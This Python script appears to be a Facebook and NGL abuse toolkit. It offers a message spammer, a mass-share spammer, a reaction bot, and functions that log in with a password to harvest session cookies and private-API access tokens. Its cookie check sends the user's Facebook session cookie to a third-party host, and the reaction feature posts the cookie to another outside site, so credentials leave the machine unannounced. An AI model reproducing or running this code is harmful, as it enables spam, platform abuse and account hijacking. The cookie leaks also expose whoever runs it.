# OWNER  : Greegmon
# SITE   : https://geesite.onrender.com
# FB		 : https://facebook.com/greegmon.1
import os
import json
import re
import requests
import mechanize
import bs4
import sys
import random
import time
import uuid
import asyncio
import aiohttp

from os import geteuid as key
line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
banner = """\033[1;91m      _____    ______      _____    _____      _____   
     / ___ \  (   __ \    / ___/   / ___/     / ___ \  
    / /   \_)  ) (__) )  ( (__    ( (__      / /   \_) 
   ( (  ____  (    __/    ) __)    ) __)    ( (  ____  
   ( ( (__  )  ) \ \  _  ( (      ( (       ( ( (__  ) 
    \ \__/ /  ( ( \ \_))  \ \___   \ \___    \ \__/ /  
     \____/    )_) \__/    \____\   \____\    \____/   

\033[93m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
"""
# clear text
from os import system as fs
def clear():
  fs('clear')

# Check cookie if Alive or Die
def cookie_check(cookie):
	res = requests.get(f"https://hoanghao.me/api/checklivecookie?cookie={cookie}")
	try:
		data = res.json()
		if data['status'] == 'Cookie Live':
			return True
		else:
			return False
	except:
		return False

# NGL spammer
def ngl():
  def sendNgl(user,mess):
    url = 'https://ngl.link/api/submit'
    payload = {"username": user,"question": mess,"deviceId": str(uuid.uuid4())}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url,json=payload, headers=headers)
    return response.status_code
  clear()
  print(banner)
  link = input(" \033[97m LINK : \033[1;91m")
  user = link.split('/')[3]
  message = input(" \033[0m\033[97m MESSAGE : \033[1;91m")
  amount = int(input(" \033[0m\033[97m AMOUNT : \033[1;91m"))
  print()
  i = 1
  while i <= amount:
    code = sendNgl(user,message)
    y,n = "\033[1;92mSUCCESS\033[0m","\033[1;91mERROR\033[0m"
    print(f"  \033[0m\033[93m[ NGL ] \033[94m[\033[92m{i}\033[94m][ {y if code == 200 else n} ]: Message sent to \033[95m{user}\033[0m")
    time.sleep(1)
    i += 1
  input("\n\n\033[0m Enter >>")
  main()

# Spam share to facebook post
def share():
  clear()
  print(banner)
  config = {
  	"cookies": '',
  	"id": ''
  }
  config['cookies'] = input("\033[97m  COOKIE: \033[1;91m")
  config['id'] = input("\033[0m\033[97m  POST LINK: \033[1;91m")
  share_count = int(input("\033[0m\033[97m  COUNT: \033[1;91m"))
  headers = {
	  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
	  'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
	  'sec-ch-ua-mobile': '?0',
	  'sec-ch-ua-platform': "Windows",
	  'sec-fetch-dest': 'document',
	  'sec-fetch-mode': 'navigate',
	  'sec-fetch-site': 'none',
	  'sec-fetch-user': '?1',
	  'upgrade-insecure-requests': '1'
  }
  if not cookie_check(config['cookies']):
  	print("\n\n\033[0m\033[1;91m  ERROR \033[0m\033[91mCookie Die or Invalid Cookie")
  	sys.exit()
  clear()
  print(banner)
  class Share:
    async def get_token(self, session):
      headers['cookie'] = config['cookies']
      async with session.get('https://business.facebook.com/content_management', headers=headers) as response:
        data = await response.text()
        access_token = 'EAAG' + re.search('EAAG(.*?)","', data).group(1)
        return access_token, headers['cookie']
    async def share(self, session, token, cookie):
      headers['cookie']
      headers['sec-fetch-dest']
      headers['sec-fetch-mode']
      headers['sec-fetch-site']
      headers['sec-fetch-user']
      headers['upgrade-insecure-requests']
      headers['accept-encoding'] = 'gzip, deflate'
      headers['host'] = 'b-graph.facebook.com'
      headers['cookie'] = cookie
      count = 0
      while count <= share_count:
        async with session.post(f'https://b-graph.facebook.com/me/feed?link=https://mbasic.facebook.com/{config["id"]}&published=0&access_token={token}', headers=headers) as response:
          data = await response.json()
          if 'id' in data:
            print(f"  \033[1;97m[ \033[92m{count}\033[97m/\033[92m{share_count} \033[97m] - \033[97m{data['id']}\033[0m",end="\r")
            count += 1
          else:
            print(f"  \033[91m[ BLOCK ]:\033[97m Cookie is blocked, ctrl c to exit !!!!\033[0m")
            print(f"  Shared: {count}/{share_count}")
            input("\n\n\033[90m Enter >>")
            sys.exit()
  async def main(num_tasks): 
    async with aiohttp.ClientSession() as session:
      share = Share()
      token, cookie = await share.get_token(session)
      tasks = []
      for i in range(num_tasks):
        task = asyncio.create_task(share.share(session, token, cookie))
        tasks.append(task)
        await asyncio.gather(*tasks)
  asyncio.run(main(1))

# React to facebook POST
def react():
	def sendReact(link,type,cookie):
		clear()
		print(banner)
		print(f"""\033[0m
  \033[97m STATUS : \033[92mSENDING
  \033[97m REACT  : \033[91m{type}
  \033[97m POST   : \033[91m{link}\033[0m\n
""")
		url = "https://flikers.net/android/android_get_react.php"
		payload = {
			"post_id": link,
			"react_type": type,
			"version": "v1.7"
		}
		headers = {
			'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 12; V2134 Build/SP1A.210812.003)",
			'Connection': "Keep-Alive",
			'Accept-Encoding': "gzip",
			'Content-Type': "application/json",
			'Cookie': cookie
		}
		res = requests.post(url, json=payload, headers=headers)
		data = res.json()
		print(f"  \033[1;97mMESSAGE: \033[0m{data['message']}")
	clear()
	print(banner)
	print("  \033[0m\033[1;97mReaction list: \033[1;93mLIKE,LOVE,CARE,HAHA,WOW,SAD,ANGRY\033[0m")
	print()
	a = input("  \033[1;97mPOST LINK: \033[91m")
	b = input("  \033[97mREACT TYPE: \033[91m")
	c = input("  \033[97mCOOKIE: \033[91m")
	if not a or not b or not c:
		print("  \n\033[1;91m ERROR: \033[0m\033[91mMissing input")
		sys.exit()
	elif not cookie_check(c):
		print("  \n\033[1;91m ERROR: \033[0m\033[91mCookie die or Invalid cookie")
		sys.exit()
	else:
		sendReact(a,b,c)

# Get the account cookie
def cookie():
	clear()
	print(banner)
	user = input("  \033[1;97mUsername: \033[91m")
	passw = input("  \033[1;97mPassword: \033[91m")
	session=requests.Session()
	headers = {
		'authority': 'free.facebook.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment closer]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'en-US,en;q=0.9',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'dpr': '3',
		'origin': 'https://free.facebook.com',
		'referer': 'https://free.facebook.com/login/?email=%s'%(user),
		'sec-ch-prefers-color-scheme': 'dark',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		'viewport-width': '980',
	}
	getlog = session.get(f'https://free.facebook.com/login.php')
	idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(getlog.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(getlog.text)).group(1),"try_number":"0","unrecognize_tries":"0","email":user,"pass":passw,"login":"Log In","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(getlog.text)).group(1),}
	comp=session.post("https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated",headers=headers,data=idpass,allow_redirects=False)
	jopl=session.cookies.get_dict().keys()
	cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
	if "c_user" in jopl:
		print(f"  \n\033[97mCOOKIE: \033[92m{cookie}")
		input("  \033[0mEnter to back >>")
		main()
	elif "checkpoint" in jopl:
		print("\033[91m\n  ERROR: \033[0m\033[91mAccount checkpoint")
		sys.exit()
	else:
		print("\033[91m\n  ERROR: \033[0m\033[91mInvalid username or password")
		sys.exit()

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [("User-Agent", "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36")]
# Get the account access token EAAAAU and EAADYP
def token():
	clear()
	print(banner)
	def EAAAAU(user,passw):
		res = br.open(f"https://b-api.facebook.com/method/auth.login?email={user}&password={passw}&format=json&generate_session_cookies=1&generate_machine_id=1&generate_analytics_claim=1&locale=en_US&client_country_code=US&credentials_type=device_based_login_password&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&fb_api_req_friendly_name=authenticate&api_key=882a8490361da98702bf97a021ddc14d&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32")
		data = json.load(res)
		if 'access_token' in data:
			return data['access_token']
		else:
			return "\033[1;91m  ERROR: \033[0m\033[91m"+data["error_msg"]
	def EAADYP(user, passw):
		res = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
		data = json.load(res)
		if 'access_token' in data:
			return data['access_token']
		else:
			return "\033[1;91mERROR: \033[0m\033[91m"+data["error_msg"]
	try:
		user = input("  \033[1;97mUSERNAME:\033[91m~ ")
		passw = input("  \033[97mPASSWORD:\033[91m~ ")
		print(f" \n\033[1;97m{line}\n [EAAAAU]: \033[92m{EAAAAU(user,passw)}\n \033[97m{line}\n [EAADYP]: \033[92m{EAADYP(user,passw)}")
		print()
		input("  \033[0m\033[90mEnter >>")
		main()
	except:
		print("\n\033[1;91m  ERROR: \033[0m\033[91mWhile getting your access token")
		sys.exit()


def main():
  clear()
  print(banner)
  what = """\033[0m \033[97m[\033[1;92m 1 \033[0m\033[97m] - \033[1;92mNGL SPAM
 \033[97m[\033[1;92m 2 \033[0m\033[97m] - \033[1;92mSPAM SHARE
 \033[97m[\033[1;92m 3 \033[0m\033[97m] - \033[1;92mFACEBOOK REACT
 \033[97m[\033[1;92m 4 \033[0m\033[97m] - \033[1;92mCOOKIE GETTER
 \033[97m[\033[1;92m 5 \033[0m\033[97m] - \033[1;92mTOKEN GETTER \033[0m\033[90m(EAAAAU,EAADYP)
    """
  print(what)
  choose = int(input(" \033[1;97m[ \033[92mChoose \033[97m]•~> \033[96m"))
  if choose == 1:
  	ngl()
  elif choose == 2:
  	share()
  elif choose == 3:
  	react()
  elif choose == 4:
  	cookie()
  elif choose == 5:
  	token()
  else:
  	sys.exit()


#approval
def approval():
	clear()
	print(banner)
	play = str(os.getuid())
	a,b,c,d,e = play[0],play[1],play[2],play[3],play[4]
	my_key = f"GREEG-8{a}{e}{c}-{b}{d}{e}8-{a}{e}{c}{d}-{b}291-{b}6{a}{e}"
	print("\033[1;97m [\u001b[96m•\033[1;97m] You Need Approval To Use This Tool   \033[1;37m")
	print("\033[1;97m [\u001b[96m•\033[1;97m] Your Key :\033[0;93m "+my_key)
	try:
		response = requests.get(f"https://Greepi.pythonanywhere.com/check?key={my_key}")
		res = response.json()
		if res['key'] == 'approved':
			print()
			print("  "+line)
			print("  \033[97m>> Your key has been \033[92mApproved ✓\033[97m:)")
			time.sleep(1)
			main()
		else:
			print()
			print("  \033[1;97m--⟩> Send me your key for approval")
			print("  \033[1;97m--⟩> \033[96mhttps://facebook.com/greegmon.1\033[0m")
			sys.exit()
	except Exception:
		print()
		print("  \033[1;91mERROR \033[0m\033[91mUnable To Fetch Data From Server")
		sys.exit()

if __name__ == '__main__':
  approval()
